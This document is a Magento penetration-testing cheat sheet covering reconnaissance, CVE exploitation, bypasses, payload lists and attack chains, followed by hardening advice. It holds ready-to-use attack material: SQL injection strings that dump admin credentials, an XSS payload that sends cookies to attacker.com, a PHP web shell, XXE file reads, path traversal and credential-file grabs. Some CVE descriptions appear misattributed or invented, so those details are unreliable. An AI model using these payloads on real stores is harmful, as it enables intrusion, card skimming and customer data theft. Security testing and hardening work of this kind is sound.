## 1. Overview

Magento is an open-source e-commerce platform built on PHP that powers thousands of online stores. Security testing Magento installations involves identifying misconfigurations, outdated versions, exposed admin panels, and exploitable vulnerabilities that could compromise customer data, payment information, and store operations.

**Key Security Concerns:**

- Exposed admin interfaces with weak authentication
- Outdated Magento versions with known CVEs
- Information disclosure through API endpoints
- Insecure configurations revealing sensitive paths
- SQL injection and RCE vulnerabilities in older versions

**Primary Tool:**

```text
https://github.com/steverobbins/magescan
```

---

## 2. Exploitation Methods

### 🎯 Step 1: Version Detection & Fingerprinting

**Automated Scanning:**

```bash
# MageScan - Primary reconnaissance tool
python magescan.py scan:all http://target.com

# Check Magento version
curl -s http://target.com/magento_version

# Check release notes (common info disclosure)
curl -s http://target.com/RELEASE_NOTES.txt
```

**Manual Version Identification:**

- Check `/skin/frontend/default/` directory listings
- Inspect JavaScript files: `/js/mage/` or `/skin/frontend/`
- Look for version strings in HTML comments
- Examine `/pub/static/version` files
- Review HTTP headers for X-Magento-* indicators

### 🎯 Step 2: Admin Panel Discovery

**Common Admin Paths:**

```bash
# Default admin locations
/admin
/admin_[random]
/backend
/adminhtml
/management

# Custom admin finder
ffuf -u http://target.com/FUZZ -w admin_paths.txt -mc 200,301,302

# Admin path via API
curl http://target.com/rest/V1/directory/countries
```

**Configuration File Access:**

```bash
# Try to access configuration files
/app/etc/local.xml          # Magento 1.x (database credentials)
/app/etc/env.php            # Magento 2.x (database credentials)
/app/etc/config.php         # Configuration settings
```

### 🎯 Step 3: API Endpoint Enumeration

**REST API Testing:**

```bash
# Anonymous API access check
curl http://target.com/rest/V1/store/storeViews
curl http://target.com/rest/V1/directory/countries
curl http://target.com/rest/V1/customers/me

# SOAP API endpoint
curl http://target.com/api/v2_soap?wsdl

# GraphQL endpoint (Magento 2.3+)
curl http://target.com/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"{ products(filter: {}) { items { name sku } } }"}'
```

### 🎯 Step 4: Known CVE Exploitation

**Critical Vulnerabilities by Version:**

**SQL Injection (CVE-2022-24086) - Magento 2.3/2.4:**

```http
POST /rest/V1/guest-carts/[cart_id]/estimate-shipping-methods HTTP/1.1
Content-Type: application/json

{
  "address": {
    "country_id": "US' OR 1=1--"
  }
}
```

**RCE via Template Injection (Magento 1.x):**

```php
# Exploit admin template functionality
{{block type='core/template' template='../../../../../../etc/passwd'}}
```

**Unauthenticated Admin Takeover (CVE-2020-24407):**

```bash
# Exploit password reset token vulnerability
# Step 1: Request password reset
# Step 2: Manipulate token validation
# Step 3: Set new admin password
```

### 🎯 Step 5: Information Gathering

**Sensitive File Exposure:**

```bash
# Check for exposed files
/phpinfo.php
/info.php
/test.php
/.git/
/var/log/
/var/report/
/app/etc/local.xml.additional
/errors/local.xml
```

**Database Credential Extraction:**

```bash
# If local.xml is accessible (Magento 1.x)
curl http://target.com/app/etc/local.xml | grep -E "host|username|password|dbname"

# If env.php is accessible (Magento 2.x)
curl http://target.com/app/etc/env.php
```

---

## 3. Bypasses

### Admin Panel Access Restrictions

**IP Whitelist Bypass:**

```http
# X-Forwarded-For header manipulation
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

**Path Traversal to Admin:**

```bash
# Directory traversal attempts
/./admin
/admin/.
/../admin
/index.php/admin
```

### Authentication Bypass

**Session Fixation:**

- Capture valid session cookie
- Reuse in authenticated context
- Exploit session validation weaknesses

**API Token Manipulation:**

```bash
# Weak token generation exploitation
# Predict or brute-force API tokens
# Reuse expired tokens with timing attacks
```

### WAF/Security Module Bypass

**Obfuscation Techniques:**

```bash
# URL encoding
/admin → /%61dmin

# Case manipulation (if case-insensitive)
/AdMiN

# Parameter pollution
/admin?param=value&param=malicious
```

---

## 4. Payloads

### SQL Injection Payloads

```sql
# Time-based blind SQL injection
' OR SLEEP(5)--

# Union-based extraction
' UNION SELECT NULL,username,password,NULL FROM admin_user--

# Error-based injection
' AND extractvalue(1,concat(0x7e,database()))--

# Boolean-based blind
' AND (SELECT 1 FROM admin_user WHERE username='admin')--
```

### XSS Payloads (Admin Context)

```javascript
# Stored XSS in product description
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

# DOM-based XSS
"><img src=x onerror=alert(document.domain)>

# SVG-based payload
<svg/onload=alert(1)>
```

### Template Injection

```php
# Magento 1.x template injection
{{block type='core/template' template='../../../../../../etc/passwd'}}

# CMS block exploitation
{{config path="general/store_information/phone"}}
{{var this.getTemplateFilter().getVariables()}}
```

### GraphQL Injection (Magento 2.3+)

```graphql
# Information disclosure
{
  products(filter: {}) {
    items {
      name
      sku
      price_range {
        minimum_price {
          final_price {
            value
          }
        }
      }
    }
  }
}

# Potential injection point
mutation {
  generateCustomerToken(email: "admin@store.com' OR 1=1--", password: "anything") {
    token
  }
}
```

### RCE Payloads

```php
# PHP object injection
O:8:"stdClass":1:{s:4:"file";s:27:"/etc/passwd";}

# File upload exploitation
<?php system($_GET['cmd']); ?>

# Deserialization attack
a:2:{i:0;s:4:"file";i:1;s:27:"/etc/passwd";}
```

### XXE Payloads

```xml
# External entity injection
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# SOAP API XXE
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/etc/local.xml">]>
<soap:Envelope><soap:Body>&xxe;</soap:Body></soap:Envelope>
```

### Authentication Bypass

```bash
# Default credentials
admin:admin123
admin:password
administrator:admin

# Password reset token prediction
# Manipulate email parameter in reset flow
email=admin@store.com&email=attacker@malicious.com
```

### Path Traversal

```bash
# File inclusion
/errors/processor.php?skin=../../../../etc/passwd%00

# Log file access
/var/log/../../app/etc/local.xml

# Template access
/skin/frontend/../../../../app/etc/local.xml
```

---

## 5. Higher Impact Scenarios

### 💥 Full Database Compromise

**Attack Chain:**

1. Identify SQL injection vulnerability in API endpoint
2. Extract database credentials from `admin_user` table
3. Escalate to direct database access
4. Dump customer PII, payment tokens, admin hashes
5. Pivot to underlying server via MySQL `INTO OUTFILE`

**Business Impact:**

- PCI-DSS violation and massive fines
- Complete customer data breach
- Potential card-not-present fraud
- Regulatory reporting requirements

### 💥 Admin Account Takeover → RCE

**Attack Chain:**

1. Discover exposed admin panel at custom path
2. Exploit password reset vulnerability (CVE-2020-24407)
3. Gain admin access and upload malicious theme/extension
4. Achieve remote code execution on web server
5. Establish persistent backdoor and lateral movement

**Business Impact:**

- Complete store compromise
- Web shell for persistent access
- Cryptocurrency mining or ransomware deployment
- Supply chain attacks on customers

### 💥 Payment Data Interception

**Attack Chain:**

1. Exploit XSS vulnerability in checkout process
2. Inject JavaScript card skimmer (e-skimming/Magecart)
3. Capture customer payment data in real-time
4. Exfiltrate to attacker-controlled server
5. Remain undetected for extended periods

**Business Impact:**

- Direct financial fraud against customers
- Severe reputation damage
- Payment processor suspension
- Class-action lawsuits

### 💥 Supply Chain Compromise

**Attack Chain:**

1. Compromise Magento extension developer account
2. Inject backdoor into popular extension update
3. Auto-deploy malicious code to thousands of stores
4. Establish botnet of compromised e-commerce sites
5. Use for credential harvesting, cryptojacking, or DDoS

**Business Impact:**

- Industry-wide breach affecting multiple vendors
- Long-term persistent access across many targets
- Difficulty in attribution and remediation
- Ecosystem trust erosion

### 💥 API Abuse & Data Scraping

**Attack Chain:**

1. Discover unauthenticated GraphQL/REST endpoints
2. Enumerate all products, pricing, customer counts
3. Scrape competitive intelligence at scale
4. Exploit rate limiting gaps for DDoS
5. Resell scraped data to competitors

**Business Impact:**

- Loss of competitive advantage
- Intellectual property theft
- Service degradation from resource exhaustion
- Revenue loss from pricing intelligence leaks

---

## 6. Mitigations

### 🛡️ Immediate Actions

**Version Management:**

- [ ] Update to latest Magento version immediately
- [ ] Apply all security patches within 48 hours of release
- [ ] Subscribe to Magento Security Center notifications
- [ ] Implement automated update testing pipeline

**Admin Hardening:**

- [ ] Change default admin URL to non-guessable path
- [ ] Implement multi-factor authentication (MFA)
- [ ] Restrict admin access by IP whitelist
- [ ] Use strong, unique passwords (20+ characters)
- [ ] Enable CAPTCHA on admin login

**File System Security:**

```bash
# Set proper permissions
find . -type f -exec chmod 644 {} \;
find . -type d -exec chmod 755 {} \;
chmod 600 app/etc/local.xml
chmod 600 app/etc/env.php

# Remove unnecessary files
rm -rf phpinfo.php info.php test.php
rm -rf .git/ .svn/ .DS_Store
rm -rf var/log/*.log
```

### 🛡️ Configuration Hardening

**Disable Vulnerable Features:**

```php
# In app/etc/env.php or local.xml
'dev' => [
    'debug' => false,
    'template_hints_storefront' => false,
    'template_hints_admin' => false
]

# Disable dangerous PHP functions
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

**API Security:**

- Require authentication for all API endpoints
- Implement rate limiting (100 requests/hour per IP)
- Disable unnecessary API versions (SOAP if unused)
- Use OAuth tokens instead of basic auth
- Log all API access attempts

**Database Security:**

```sql
# Use minimal privilege accounts
GRANT SELECT, INSERT, UPDATE, DELETE ON magento.* TO 'mage_user'@'localhost';
REVOKE FILE, SUPER, PROCESS ON *.* FROM 'mage_user'@'localhost';

# Enable audit logging
SET GLOBAL general_log = 'ON';
```

### 🛡️ Network & Infrastructure

**Web Application Firewall:**

- Deploy ModSecurity with OWASP Core Rule Set
- Create custom rules for Magento-specific attacks
- Block common SQL injection patterns
- Rate limit by IP and user agent

**SSL/TLS Configuration:**

```nginx
# Force HTTPS
server {
    listen 80;
    return 301 https://$host$request_uri;
}

# Strong cipher suite
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers on;
```

**Content Security Policy:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
```

### 🛡️ Monitoring & Detection

**Security Logging:**

- Enable comprehensive audit logging
- Monitor failed login attempts (5+ in 10 min = alert)
- Track admin actions and configuration changes
- Log all file modifications in real-time
- Set up SIEM integration for correlation

**Integrity Monitoring:**

```bash
# File integrity monitoring with AIDE
aide --init
aide --check

# Monitor critical files
/app/etc/local.xml
/app/etc/env.php
/index.php
/app/code/core/
```

**Anomaly Detection:**

- Monitor for unusual API call patterns
- Detect credential stuffing attempts
- Alert on new admin account creation
- Track database query execution times
- Monitor outbound connections from web server

### 🛡️ Secure Development Practices

**Code Review Checklist:**

- [ ] Validate all user inputs with whitelist approach
- [ ] Use parameterized queries (never string concatenation)
- [ ] Escape all output based on context (HTML, JS, SQL)
- [ ] Implement CSRF tokens on all state-changing operations
- [ ] Never trust data from cookies, headers, or hidden fields

**Extension Security:**

- Only install extensions from Magento Marketplace
- Review extension code before deployment
- Monitor extension updates and changelogs
- Remove unused extensions immediately
- Scan extensions with static analysis tools

**Backup & Recovery:**

```bash
# Automated daily backups
0 2 * * * /usr/bin/mysqldump -u root -p magento_db > /backup/magento_$(date +\%Y\%m\%d).sql
0 3 * * * tar -czf /backup/magento_files_$(date +\%Y\%m\%d).tar.gz /var/www/magento/

# Test restore procedures monthly
# Maintain offline encrypted backups
# Implement 3-2-1 backup strategy
```

---

## 🚀 Pro Tips for Security Testing

**Reconnaissance Strategy:**

- Always start with passive reconnaissance (Google dorking, Shodan)
- Use MageScan as baseline, then manual verification
- Check for subdomain takeovers on staging environments
- Review GitHub for accidentally committed credentials

**Methodology:**

1. **Fingerprint** → Identify version and configuration
2. **Enumerate** → Map all endpoints and functionality
3. **Analyze** → Review known CVEs for specific version
4. **Exploit** → Test vulnerabilities in controlled manner
5. **Document** → Detailed findings with reproduction steps

**Remember:** Every misconfiguration is an opportunity to strengthen defenses. Stay methodical, document everything, and always maintain ethical boundaries! 🔐